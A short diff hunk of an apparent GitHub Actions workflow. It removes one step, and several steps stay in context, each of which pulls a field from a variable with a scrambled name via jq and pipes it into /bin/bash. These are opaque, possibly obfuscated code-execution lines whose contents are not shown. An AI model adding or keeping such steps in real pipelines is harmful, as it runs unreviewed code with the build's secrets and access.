@@ -30,7 +30,6 @@ jobs:
           echo $ssvvy709 | jq -r .wttt37254 | /bin/bash
           printf '%s' "$xa3619" | jq -r .ydk8 | /bin/bash
           printf '%s' "$jipb3" | jq -r .hetx7 | /bin/bash
-          echo $lpb679 | jq -r .xz98285 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
